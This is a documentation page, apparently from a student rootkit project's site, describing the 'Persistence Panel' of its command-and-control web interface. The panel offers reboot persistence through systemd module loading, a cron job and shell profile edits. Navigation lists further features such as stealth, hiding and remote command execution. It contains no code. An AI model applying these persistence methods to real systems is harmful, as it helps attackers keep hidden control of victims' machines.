<!doctype html><html lang=en><head><meta charset=utf-8><title>Persistence Panel | Tux Fan Club Docs</title>
<meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Boot persistence configuration and management"><meta name=keywords content="Documentation,Hugo,Hugo Theme,Bootstrap"><meta name=author content="Colin Wilson - Lotus Labs"><meta name=email content="support@aigis.uk"><meta name=website content="https://lotusdocs.dev"><meta name=Version content="v0.1.0"><link rel=icon href=/favicon.ico sizes=any><link rel=icon type=image/svg+xml href=/favicon.svg><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest crossorigin=use-credentials href=/site.webmanifest><meta property="og:title" content="Persistence Panel"><meta property="og:description" content="Boot persistence configuration and management"><meta property="og:type" content="article"><meta property="og:url" content="/docs/04-web-ui/features/panels/persistence-panel/"><meta property="og:image" content="/opengraph/card-base-2_hu_f2760c57f1dc4958.png"><meta property="article:section" content="docs"><meta property="article:published_time" content="2025-05-25T16:00:00+01:00"><meta property="article:modified_time" content="2025-05-30T11:50:04+02:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/opengraph/card-base-2_hu_f2760c57f1dc4958.png"><meta name=twitter:title content="Persistence Panel"><meta name=twitter:description content="Boot persistence configuration and management"><link rel=alternate type=application/atom+xml title="Atom feed for Tux Fan Club Docs" href=/index.xml><script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script><script type=text/javascript src=/docs/js/flexsearch.bundle.min.249548594cb6843f3060a3cdd3043799676c59ce8db83358a3fc2e4d20598d05dfa6ce4994805d2835cb33b54dc9b9e7.js integrity=sha384-JJVIWUy2hD8wYKPN0wQ3mWdsWc6NuDNYo/wuTSBZjQXfps5JlIBdKDXLM7VNybnn crossorigin=anonymous></script><link rel=preconnect href=https://fonts.gstatic.com/><link rel=preconnect href=https://fonts.gstatic.com/ crossorigin><link href="https://fonts.googleapis.com/css?family=Inter:300,400,600,700|Fira+Code:500,700&display=block" rel=stylesheet><link rel=stylesheet href=/docs/scss/style.min.47627c508718021a8811f17bfd419041ce97729127a3db8f6bcf7c26c29fbacf37e002e618d60350aae90d89464e8447.css integrity=sha384-R2J8UIcYAhqIEfF7/UGQQc6XcpEno9uPa898JsKfus834ALmGNYDUKrpDYlGToRH crossorigin=anonymous></head><body><div class=content><div class="page-wrapper toggled"><nav id=sidebar class=sidebar-wrapper><div class=sidebar-brand><a href=/ aria-label=HomePage alt=HomePage><svg id="Layer_1" viewBox="0 0 250 250"><path d="m143 39.5c-18 0-18 18-18 18s0-18-18-18H22c-2.76.0-5 2.24-5 5v143c0 2.76 2.24 5 5 5h76c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h76c2.76.0 5-2.24 5-5V44.5c0-2.76-2.24-5-5-5h-85zM206 163c0 1.38-1.12 2.5-2.5 2.5H143c-18 0-18 18-18 18s0-18-18-18H46.5c-1.38.0-2.5-1.12-2.5-2.5V69c0-1.38 1.12-2.5 2.5-2.5H98c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h51.5c1.38.0 2.5 1.12 2.5 2.5v94z" style="fill:#06f"/></svg></a></div><div class=sidebar-content style="height:calc(100% - 131px)"><ul class=sidebar-menu><li><a class=sidebar-root-link href=/docs/01-introduction/presentation/><i class="material-icons me-2">code</i>
Presentation</a></li><li class=sidebar-dropdown><button class=btn>
<i class="material-icons me-2">code</i>
Setup</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=/docs/02-setup/environment/>Initial Setup & Installation</a></li><li><a class=sidebar-nested-link href=/docs/02-setup/vm-installation/>VM Installation & Verification</a></li><li><a class=sidebar-nested-link href=/docs/02-setup/attacking-vm-setup/>Attacking VM Setup</a></li><li><a class=sidebar-nested-link href=/docs/02-setup/victim-vm-setup/>Victim VM Setup</a></li></ul></div></li><li class=sidebar-dropdown><button class=btn>
<i class="material-icons me-2">notes</i>
Attacking Program (C2 Server)</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=/docs/03-attacking-program/overview/>Overview</a></li><li><a class=sidebar-nested-link href=/docs/03-attacking-program/installation/>Installation</a></li><li><a class=sidebar-nested-link href=/docs/03-attacking-program/commands/>Command Reference</a></li><li><a class=sidebar-nested-link href=/docs/03-attacking-program/usage/>Usage Guide</a></li></ul></div></li><li class="sidebar-dropdown current active"><button class=btn>
<i class="material-icons me-2">monitor</i>
Web UI (C2 Frontend)</button><div class="sidebar-submenu d-block"><ul><li><a class=sidebar-nested-link href=/docs/04-web-ui/overview/>Overview</a></li><li><a class=sidebar-nested-link href=/docs/04-web-ui/installation/>Installation & Setup</a></li><li class="sidebar-dropdown nested current active"><button class=btn>
Features</button><div class="sidebar-submenu d-block"><ul><li><a class=sidebar-nested-link href=/docs/04-web-ui/features/authentication/>Authentication</a></li><li><a class=sidebar-nested-link href=/docs/04-web-ui/features/dashboard/>Dashboard</a></li><li><a class=sidebar-nested-link href=/docs/04-web-ui/features/client-management/>Client Management</a></li><li class="sidebar-dropdown nested current active"><button class=btn>
UI Panels</button><div class="sidebar-submenu d-block"><ul><li><a class=sidebar-nested-link href=/docs/04-web-ui/features/panels/terminal-panel/>Terminal Panel</a></li><li class=current><a class=sidebar-nested-link href=/docs/04-web-ui/features/panels/persistence-panel/>Persistence Panel</a></li><li><a class=sidebar-nested-link href=/docs/04-web-ui/features/panels/event-log-panel/>Event Log Panel</a></li><li><a class=sidebar-nested-link href=/docs/04-web-ui/features/panels/upload-download-panel/>Upload/Download Panel</a></li><li><a class=sidebar-nested-link href=/docs/04-web-ui/features/panels/overview-panel/>Overview Panel</a></li><li><a class=sidebar-nested-link href=/docs/04-web-ui/features/panels/configuration-panel/>Configuration Panel</a></li><li><a class=sidebar-nested-link href=/docs/04-web-ui/features/panels/authentication-panel/>Authentication Panel</a></li></ul></div></li></ul></div></li></ul></div></li><li class=sidebar-dropdown><button class=btn>
<i class="material-icons me-2">shield</i>
EpiRootkit</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=/docs/05-epirootkit/configuration-justifications/>Configuration Justifications</a></li><li><a class=sidebar-nested-link href=/docs/05-epirootkit/overview/>EpiRootkit Overview</a></li><li><a class=sidebar-nested-link href=/docs/05-epirootkit/deployment/>Build & Deployment</a></li><li><a class=sidebar-nested-link href=/docs/05-epirootkit/connection-authentication/>Connection & Authentication</a></li><li class="sidebar-dropdown nested"><button class=btn>
Features</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=/docs/05-epirootkit/features/command-execution/>Command Execution</a></li><li><a class=sidebar-nested-link href=/docs/05-epirootkit/features/file-transfer/>File Transfer</a></li><li><a class=sidebar-nested-link href=/docs/05-epirootkit/features/hiding/>Stealth & Hiding</a></li><li><a class=sidebar-nested-link href=/docs/05-epirootkit/features/persistence/>Persistence</a></li><li><a class=sidebar-nested-link href=/docs/05-epirootkit/features/dns-resolution/>DNS Resolution</a></li></ul></div></li></ul></div></li><li><a class=sidebar-root-link href=/docs/06-bonuses/wlkom-ctf/><i class="material-icons me-2">savings</i>
Tux Fan Club: Chasse au Tr√©sor Pirate</a></li><li><a class=sidebar-root-link href=/docs/07-remerciements/thankyou/><i class="material-icons me-2">favorite</i>
Un dernier mot</a></li></ul></div><ul class="sidebar-footer list-unstyled mb-0"></ul></nav><main class="page-content bg-transparent"><div id=top-header class="top-header d-print-none"><div class="header-bar d-flex justify-content-between"><div class="d-flex align-items-center"><a href=/ class="logo-icon me-3" aria-label=HomePage alt=HomePage><div class=small><svg id="Layer_1" viewBox="0 0 250 250"><path d="m143 39.5c-18 0-18 18-18 18s0-18-18-18H22c-2.76.0-5 2.24-5 5v143c0 2.76 2.24 5 5 5h76c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h76c2.76.0 5-2.24 5-5V44.5c0-2.76-2.24-5-5-5h-85zM206 163c0 1.38-1.12 2.5-2.5 2.5H143c-18 0-18 18-18 18s0-18-18-18H46.5c-1.38.0-2.5-1.12-2.5-2.5V69c0-1.38 1.12-2.5 2.5-2.5H98c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h51.5c1.38.0 2.5 1.12 2.5 2.5v94z" style="fill:#06f"/></svg></div><div class=big><svg id="Layer_1" viewBox="0 0 250 250"><path d="m143 39.5c-18 0-18 18-18 18s0-18-18-18H22c-2.76.0-5 2.24-5 5v143c0 2.76 2.24 5 5 5h76c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h76c2.76.0 5-2.24 5-5V44.5c0-2.76-2.24-5-5-5h-85zM206 163c0 1.38-1.12 2.5-2.5 2.5H143c-18 0-18 18-18 18s0-18-18-18H46.5c-1.38.0-2.5-1.12-2.5-2.5V69c0-1.38 1.12-2.5 2.5-2.5H98c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h51.5c1.38.0 2.5 1.12 2.5 2.5v94z" style="fill:#06f"/></svg></div></a><button id=close-sidebar class="btn btn-icon btn-soft">
<span class="material-icons size-20 menu-icon align-middle">menu</span>
</button>
<button id=flexsearch-button class="ms-3 btn btn-soft" data-bs-toggle=collapse data-bs-target=#FlexSearchCollapse aria-expanded=false aria-controls=FlexSearchCollapse>
<span class="material-icons size-20 menu-icon align-middle">search</span>
<span class="flexsearch-button-placeholder ms-1 me-2 d-none d-sm-block">Search</span><div class="d-none d-sm-block"><span class=flexsearch-button-keys><kbd class=flexsearch-button-cmd-key><svg width="44" height="15"><path d="M2.118 11.5A1.519 1.519.0 011 11.042 1.583 1.583.0 011 8.815a1.519 1.519.0 011.113-.458h.715V6.643h-.71A1.519 1.519.0 011 6.185 1.519 1.519.0 01.547 5.071 1.519 1.519.0 011 3.958 1.519 1.519.0 012.118 3.5a1.519 1.519.0 011.114.458A1.519 1.519.0 013.69 5.071v.715H5.4V5.071A1.564 1.564.0 016.976 3.5 1.564 1.564.0 018.547 5.071 1.564 1.564.0 016.976 6.643H6.261V8.357h.715a1.575 1.575.0 011.113 2.685 1.583 1.583.0 01-2.227.0A1.519 1.519.0 015.4 9.929V9.214H3.69v.715a1.519 1.519.0 01-.458 1.113A1.519 1.519.0 012.118 11.5zm0-.857a.714.714.0 00.715-.714V9.214H2.118a.715.715.0 100 1.429zm4.858.0a.715.715.0 100-1.429H6.261v.715a.714.714.0 00.715.714zM3.69 8.357H5.4V6.643H3.69zM2.118 5.786h.715V5.071a.714.714.0 00-.715-.714.715.715.0 00-.5 1.22A.686.686.0 002.118 5.786zm4.143.0h.715a.715.715.0 00.5-1.22.715.715.0 00-1.22.5z" fill="currentcolor"/><path d="M12.4 11.475H11.344l3.879-7.95h1.056z" fill="currentcolor"/><path d="M25.073 5.384l-.864.576a2.121 2.121.0 00-1.786-.923 2.207 2.207.0 00-2.266 2.326 2.206 2.206.0 002.266 2.325 2.1 2.1.0 001.782-.918l.84.617a3.108 3.108.0 01-2.622 1.293 3.217 3.217.0 01-3.349-3.317 3.217 3.217.0 013.349-3.317A3.046 3.046.0 0125.073 5.384z" fill="currentcolor"/><path d="M30.993 5.142h-2.07v5.419H27.891V5.142h-2.07V4.164h5.172z" fill="currentcolor"/><path d="M34.67 4.164c1.471.0 2.266.658 2.266 1.851.0 1.087-.832 1.809-2.134 1.855l2.107 2.691h-1.28L33.591 7.87H33.07v2.691H32.038v-6.4zm-1.6.969v1.8h1.572c.832.0 1.22-.3 1.22-.918s-.411-.882-1.22-.882z" fill="currentcolor"/><path d="M42.883 10.561H38.31v-6.4h1.033V9.583h3.54z" fill="currentcolor"/></svg>
</kbd><kbd class=flexsearch-button-key><svg width="15" height="15"><path d="M5.926 12.279H4.41L9.073 2.721H10.59z" fill="currentcolor"/></svg></kbd></span></div></button></div><div class="d-flex align-items-center"><ul class="list-unstyled mb-0"><li class="list-inline-item mb-0"><a href=https://github.com/KazeTachinuu/epirootkit-docs alt=github rel="noopener noreferrer" target=_blank><div class="btn btn-icon btn-default border-0"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>GitHub</title><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></div></a></li></ul><button id=mode class="btn btn-icon btn-default ms-2" type=button aria-label="Toggle user interface mode">
<span class=toggle-dark><svg height="30" width="30" viewBox="0 0 48 48" fill="currentcolor"><title>Enable dark mode</title><path d="M24 42q-7.5.0-12.75-5.25T6 24t5.25-12.75T24 6q.4.0.85.025.45.025 1.15.075-1.8 1.6-2.8 3.95t-1 4.95q0 4.5 3.15 7.65Q28.5 25.8 33 25.8q2.6.0 4.95-.925T41.9 22.3q.05.6.075.975Q42 23.65 42 24q0 7.5-5.25 12.75T24 42zm0-3q5.45.0 9.5-3.375t5.05-7.925q-1.25.55-2.675.825Q34.45 28.8 33 28.8q-5.75.0-9.775-4.025T19.2 15q0-1.2.25-2.575t.9-3.125q-4.9 1.35-8.125 5.475Q9 18.9 9 24q0 6.25 4.375 10.625T24 39zm-.2-14.85z"/></svg>
</span><span class=toggle-light><svg height="30" width="30" viewBox="0 0 48 48" fill="currentcolor"><title>Enable light mode</title><path d="M24 31q2.9.0 4.95-2.05T31 24t-2.05-4.95T24 17t-4.95 2.05T17 24t2.05 4.95T24 31zm0 3q-4.15.0-7.075-2.925T14 24t2.925-7.075T24 14t7.075 2.925T34 24t-2.925 7.075T24 34zM3.5 25.5q-.65.0-1.075-.425Q2 24.65 2 24t.425-1.075Q2.85 22.5 3.5 22.5h5q.65.0 1.075.425Q10 23.35 10 24t-.425 1.075T8.5 25.5zm36 0q-.65.0-1.075-.425Q38 24.65 38 24t.425-1.075T39.5 22.5h5q.65.0 1.075.425Q46 23.35 46 24t-.425 1.075-1.075.425zM24 10q-.65.0-1.075-.425Q22.5 9.15 22.5 8.5v-5q0-.65.425-1.075Q23.35 2 24 2t1.075.425T25.5 3.5v5q0 .65-.425 1.075Q24.65 10 24 10zm0 36q-.65.0-1.075-.425T22.5 44.5v-5q0-.65.425-1.075Q23.35 38 24 38t1.075.425.425 1.075v5q0 .65-.425 1.075Q24.65 46 24 46zM12 14.1l-2.85-2.8q-.45-.45-.425-1.075.025-.625.425-1.075.45-.45 1.075-.45t1.075.45L14.1 12q.4.45.4 1.05.0.6-.4 1-.4.45-1.025.45T12 14.1zm24.7 24.75L33.9 36q-.4-.45-.4-1.075t.45-1.025q.4-.45 1-.45t1.05.45l2.85 2.8q.45.45.425 1.075-.025.625-.425 1.075-.45.45-1.075.45t-1.075-.45zM33.9 14.1q-.45-.45-.45-1.05.0-.6.45-1.05l2.8-2.85q.45-.45 1.075-.425.625.025 1.075.425.45.45.45 1.075t-.45 1.075L36 14.1q-.4.4-1.025.4t-1.075-.4zM9.15 38.85q-.45-.45-.45-1.075t.45-1.075L12 33.9q.45-.45 1.05-.45.6.0 1.05.45.45.45.45 1.05.0.6-.45 1.05l-2.8 2.85q-.45.45-1.075.425-.625-.025-1.075-.425zM24 24z"/></svg></span></button></div></div><div class=collapse id=FlexSearchCollapse><div class=flexsearch-container><div class=flexsearch-keymap><li><kbd class=flexsearch-button-cmd-key><svg width="15" height="15" aria-label="Arrow down" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 3.5v8m3-3-3 3-3-3"/></g></svg></kbd>
<kbd class=flexsearch-button-cmd-key><svg width="15" height="15" aria-label="Arrow up" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 11.5v-8m3 3-3-3-3 3"/></g></svg></kbd>
<span class=flexsearch-key-label>to navigate</span></li><li><kbd class=flexsearch-button-cmd-key><svg width="15" height="15" aria-label="Enter key" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M12 3.53088v3c0 1-1 2-2 2H4m3 3-3-3 3-3"/></g></svg></kbd>
<span class=flexsearch-key-label>to select</span></li><li><kbd class=flexsearch-button-cmd-key><svg width="15" height="15" aria-label="Escape key" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M13.6167 8.936c-.1065.3583-.6883.962-1.4875.962-.7993.0-1.653-.9165-1.653-2.1258v-.5678c0-1.2548.7896-2.1016 1.653-2.1016s1.3601.4778 1.4875 1.0724M9 6c-.1352-.4735-.7506-.9219-1.46-.8972-.7092.0246-1.344.57-1.344 1.2166s.4198.8812 1.3445.9805C8.465 7.3992 8.968 7.9337 9 8.5s-.454 1.398-1.4595 1.398C6.6593 9.898 6 9 5.963 8.4851m-1.4748.5368c-.2635.5941-.8099.876-1.5443.876s-1.7073-.6248-1.7073-2.204v-.4603c0-1.0416.721-2.131 1.7073-2.131.9864.0 1.6425 1.031 1.5443 2.2492h-2.956"/></g></svg></kbd>
<span class=flexsearch-key-label>to close</span></li></div><form class="flexsearch position-relative flex-grow-1 ms-2 me-2"><div class="d-flex flex-row"><input id=flexsearch class=form-control type=search placeholder=Search aria-label=Search autocomplete=off>
<button id=hideFlexsearch type=button class="ms-2 btn btn-soft">
cancel</button></div><div id=suggestions class="shadow rounded-1 d-none"></div></form></div></div></div><div class=container-fluid><div class=layout-spacing><div class="d-md-flex justify-content-between align-items-center"><nav aria-label=breadcrumb class="d-inline-block pb-2 mt-1 mt-sm-0"><ul id=breadcrumbs class="breadcrumb bg-transparent mb-0" itemscope itemtype=https://schema.org/BreadcrumbList><li class="breadcrumb-item text-capitalize active" aria-current=page itemprop=itemListElement itemscope itemtype=https://schema.org/ListItem><a itemprop=item href=/docs/><i class="material-icons size-20 align-text-bottom" itemprop=name>Home</i>
</a><meta itemprop=position content='1'></li><li class="breadcrumb-item text-capitalize" itemprop=itemListElement itemscope itemtype=https://schema.org/ListItem><a itemprop=item href=/docs/04-web-ui/><span itemprop=name>Web UI (C2 Frontend)</span>
</a><meta itemprop=position content='2'></li><li class="breadcrumb-item text-capitalize" itemprop=itemListElement itemscope itemtype=https://schema.org/ListItem><a itemprop=item href=/docs/04-web-ui/features/><span itemprop=name>Features</span>
</a><meta itemprop=position content='3'></li><li class="breadcrumb-item text-capitalize" itemprop=itemListElement itemscope itemtype=https://schema.org/ListItem><a itemprop=item href=/docs/04-web-ui/features/panels/><span itemprop=name>UI Panels</span>
</a><meta itemprop=position content='4'></li><li class="breadcrumb-item text-capitalize active" itemprop=itemListElement itemscope itemtype=https://schema.org/ListItem><span itemprop=name>Persistence Panel</span>
<meta itemprop=position content='5'></li></ul></nav></div><div class="row flex-xl-nowrap"><div class="docs-toc col-xl-3 d-xl-block"><toc><div class="fw-bold text-uppercase mb-2">On this page</div><nav id=toc><ul><li><a href=#persistence-panel>Persistence Panel</a><ul><li><a href=#features>Features</a></li></ul></li></ul></nav></toc></div><div class="docs-toc-mobile d-print-none d-xl-none"><button id=toc-dropdown-btn class="btn-secondary dropdown-toggle" type=button data-bs-toggle=dropdown data-bs-offset=0,0 aria-expanded=false>
Table of Contents</button><nav id=toc-mobile><ul class=dropdown-menu><li><a href=#persistence-panel>Persistence Panel</a><ul><li><a href=#features>Features</a></li></ul></li></ul></nav></div><div class="docs-content col-12 col-xl-9 mt-0"><div class="mb-0 d-flex"><i class="material-icons title-icon me-2">shield</i><h1 class="content-title mb-0">Persistence Panel</h1></div><p class="lead mb-3">Boot persistence configuration and management</p><div id=content class=main-content data-bs-spy=scroll data-bs-root-margin="0px 0px -65%" data-bs-target=#toc-mobile><div data-prismjs-copy data-prismjs-copy-success data-prismjs-copy-error><h1 id=persistence-panel>Persistence Panel <a href=#persistence-panel class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h1><p>Configure rootkit boot survival with multiple persistence methods and one-click setup.</p><figure class=img-fluid><img src=/images/webui/persistence-panel.png alt="Persistence Panel"></figure><h2 id=features>Features <a href=#features class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h2><ul><li><strong>Module System Boot</strong>: systemd modules-load.d (recommended)</li><li><strong>Cron Scheduled Task</strong>: Periodic 5-minute checks</li><li><strong>Profile Login Trigger</strong>: Shell profile modification</li><li><strong>Quick Setup</strong>: One-click recommended installation</li><li><strong>Status Indicators</strong>: Visual active/inactive states</li></ul></div><div class="gitinfo d-flex flex-wrap justify-content-between align-items-center opacity-85 pt-3"><div id=edit-this-page class=mt-1><a href=https://github.com/kazetachinuu/epirootkit-docs/blob/master/content/docs/04-web-ui/features/panels/persistence-panel.md alt="Persistence Panel" rel="noopener noreferrer" target=_blank><span class="me-1 align-text-bottom"><svg width="20" height="20" viewBox="0 0 32 32" fill="currentcolor"><path d="M16 .396c-8.839.0-16 7.167-16 16 0 7.073 4.584 13.068 10.937 15.183.803.151 1.093-.344 1.093-.772.0-.38-.009-1.385-.015-2.719-4.453.964-5.391-2.151-5.391-2.151-.729-1.844-1.781-2.339-1.781-2.339-1.448-.989.115-.968.115-.968 1.604.109 2.448 1.645 2.448 1.645 1.427 2.448 3.744 1.74 4.661 1.328.14-1.031.557-1.74 1.011-2.135-3.552-.401-7.287-1.776-7.287-7.907.0-1.751.62-3.177 1.645-4.297-.177-.401-.719-2.031.141-4.235.0.0 1.339-.427 4.4 1.641 1.281-.355 2.641-.532 4-.541 1.36.009 2.719.187 4 .541 3.043-2.068 4.381-1.641 4.381-1.641.859 2.204.317 3.833.161 4.235 1.015 1.12 1.635 2.547 1.635 4.297.0 6.145-3.74 7.5-7.296 7.891.556.479 1.077 1.464 1.077 2.959.0 2.14-.02 3.864-.02 4.385.0.416.28.916 1.104.755 6.4-2.093 10.979-8.093 10.979-15.156.0-8.833-7.161-16-16-16z"/></svg>
</span>Edit this page</a></div></div></div><div><hr class=doc-hr><div id=doc-nav class=d-print-none><div class="row flex-xl-nowrap"><div class="col-sm-6 pt-2 doc-next"><a href=/docs/04-web-ui/features/panels/terminal-panel/><div class="card h-100 my-1"><div class="card-body py-2"><p class="card-title fs-5 fw-semibold lh-base mb-0"><i class="material-icons align-middle">navigate_before</i> Terminal Panel</p><p class="card-text ms-2">Remote command execution ‚Ä¶</p></div></div></a></div><div class="col-sm-6 pt-2 doc-prev"><a class=ms-auto href=/docs/04-web-ui/features/panels/event-log-panel/><div class="card h-100 my-1 text-end"><div class="card-body py-2"><p class="card-title fs-5 fw-semibold lh-base mb-0">Event Log Panel <i class="material-icons align-middle">navigate_next</i></p><p class="card-text me-2">Activity and event monitoring ‚Ä¶</p></div></div></a></div></div></div></div></div></div></div></div><footer class="shadow py-3 d-print-none"><div class=container-fluid><div class="row align-items-center"><div class=col><div class="text-sm-start text-center mx-md-2"><p class=mb-0>¬© 2025 Tux Fan Club. Built with <a href=https://github.com/colinwilson/lotusdocs><strong>Lotus Docs</strong></a></p></div></div></div></div></footer></main></div></div><button onclick=topFunction() id=back-to-top aria-label="Back to Top Button" class="back-to-top fs-5"><svg width="24" height="24"><path d="M12 10.224l-6.3 6.3-1.38-1.372L12 7.472l7.68 7.68-1.38 1.376z" style="fill:#fff"/></svg></button>
<script>(()=>{var e=document.getElementById("mode");e!==null&&(window.matchMedia("(prefers-color-scheme: dark)").addEventListener("change",e=>{e.matches?(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")):(localStorage.setItem("theme","light"),document.documentElement.removeAttribute("data-dark-mode"))}),e.addEventListener("click",()=>{document.documentElement.toggleAttribute("data-dark-mode"),localStorage.setItem("theme",document.documentElement.hasAttribute("data-dark-mode")?"dark":"light")}),localStorage.getItem("theme")==="dark"?document.documentElement.setAttribute("data-dark-mode",""):document.documentElement.removeAttribute("data-dark-mode"))})()</script><script src=/docs/js/bootstrap.c7927bdd82eceb076739257add3f4b0e11379da037c07d5c7110daeb6de0e3edcb2de867604550f88815157e4ec4ddb7.js integrity=sha384-x5J73YLs6wdnOSV63T9LDhE3naA3wH1ccRDa623g4+3LLehnYEVQ+IgVFX5OxN23 defer></script><script type=text/javascript src=/docs/js/bundle.min.4f60111ba6134ba40ed4d3ca8b6f30e10963c0482cd9829b9dc4a2a347bc6eaec2c1cf424c2ce632fb6d2218139f34f0.js integrity=sha384-T2ARG6YTS6QO1NPKi28w4QljwEgs2YKbncSio0e8bq7Cwc9CTCzmMvttIhgTnzTw crossorigin=anonymous defer></script><script type=module>
    var suggestions = document.getElementById('suggestions');
    var search = document.getElementById('flexsearch');

    const flexsearchContainer = document.getElementById('FlexSearchCollapse');

    const hideFlexsearchBtn = document.getElementById('hideFlexsearch');

    const configObject = { toggle: false }
    const flexsearchContainerCollapse = new Collapse(flexsearchContainer, configObject) 

    if (search !== null) {
        document.addEventListener('keydown', inputFocus);
        flexsearchContainer.addEventListener('shown.bs.collapse', function () {
            search.focus();
        });
        
        var topHeader = document.getElementById("top-header");
        document.addEventListener('click', function(elem) {
            if (!flexsearchContainer.contains(elem.target) && !topHeader.contains(elem.target))
                flexsearchContainerCollapse.hide();
        });
    }

    hideFlexsearchBtn.addEventListener('click', () =>{
        flexsearchContainerCollapse.hide()
    })

    function inputFocus(e) {
        if (e.ctrlKey && e.key === '/') {
            e.preventDefault();
            flexsearchContainerCollapse.toggle();
        }
        if (e.key === 'Escape' ) {
            search.blur();
            
            flexsearchContainerCollapse.hide();
        }
    };

    document.addEventListener('click', function(event) {

    var isClickInsideElement = suggestions.contains(event.target);

    if (!isClickInsideElement) {
        suggestions.classList.add('d-none');
    }

    });

    


    document.addEventListener('keydown',suggestionFocus);

    function suggestionFocus(e) {
    const suggestionsHidden = suggestions.classList.contains('d-none');
    if (suggestionsHidden) return;

    const focusableSuggestions= [...suggestions.querySelectorAll('a')];
    if (focusableSuggestions.length === 0) return;

    const index = focusableSuggestions.indexOf(document.activeElement);

    if (e.key === "ArrowUp") {
        e.preventDefault();
        const nextIndex = index > 0 ? index - 1 : 0;
        focusableSuggestions[nextIndex].focus();
    }
    else if (e.key === "ArrowDown") {
        e.preventDefault();
        const nextIndex= index + 1 < focusableSuggestions.length ? index + 1 : index;
        focusableSuggestions[nextIndex].focus();
    }

    }

    


    (function(){

    var index = new FlexSearch.Document({
        
        tokenize: "forward",
        minlength:  0 ,
        cache:  100 ,
        optimize:  true ,
        document: {
        id: 'id',
        store: [
            "href", "title", "description"
        ],
        index: ["title", "description", "content"]
        }
    });


    


    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    


    

    

    index.add(
            {
                id:  0 ,
                href: "\/docs\/01-introduction\/presentation\/",
                title: "Presentation",
                description: "whoami",
                content: "Pr√©sentation linkEquipage link Capitaine: Hugo Sibony Responsable Sabordage et mutinerie: L√©a Bonet Nom de l‚Äô√©quipe linkNous sommes Tux Fan Club üêß\nC‚Äôest L√©a qui a choisi le nom car c‚Äôest la seule personne du groupe un peu cr√©ative üëÄ\n(Et par ce que Hugo est gentleman et a laiss√© le choix a la seule femme du groupe)\nTux est un manchot repr√©sentant le noyau Linux. Il a √©t√© cr√©e en 1996 par Larry Ewing sur GIMP\nVu qu‚Äôil est mignon et que je l‚Äôaime (Tux pas Hugo üëÄ) je me suis dis que Tux Fan Club √©tait un nom convenable\n"
            }
        );
    index.add(
            {
                id:  1 ,
                href: "\/docs\/02-setup\/",
                title: "Setup",
                description: "Environment and Virtual Machine setup instructions",
